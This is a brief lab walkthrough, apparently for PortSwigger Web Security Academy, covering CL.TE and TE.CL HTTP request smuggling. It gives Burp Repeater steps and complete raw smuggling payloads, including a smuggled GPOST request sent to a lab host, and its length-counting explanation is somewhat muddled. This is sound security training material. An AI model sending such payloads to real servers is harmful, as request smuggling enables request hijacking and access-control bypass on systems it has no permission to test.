### CL.TE 
Copy 2 GET request. Change request method GET to POST in first request. Add following things in first request.
```txt
Content-Length: 15
Transfer-Encoding: chunked

0

HACKED
```
Now send both request one by one and see error message in second request's response. 
### TE.CL
Send a GET request in repeater and convert it to POST. Add Transfer-Encoding header and construct a GPOST payload. Count content length after GPOST to \r\n and add +1 with totall content length (In this case Content Length is 9d). Set Content-Length of POST request 2+2 = 4 (where c.l of 9d = 2). Uncheck Update c.l in burp repeater and send the request twice. Now, you can see "Unrecognized method GPOST" which means this target is vulnerable to smuggling.
```txt
POST / HTTP/1.1
Host: 0a5100c4035607e984f33b25009300f5.web-security-academy.net
Cookie: session=yErlfd1VMHYJ0vU897293SwfIhZulBhs
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://portswigger.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

9d
GPOST / HTTP/1.1
Host: 0a5100c4035607e984f33b25009300f5.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```
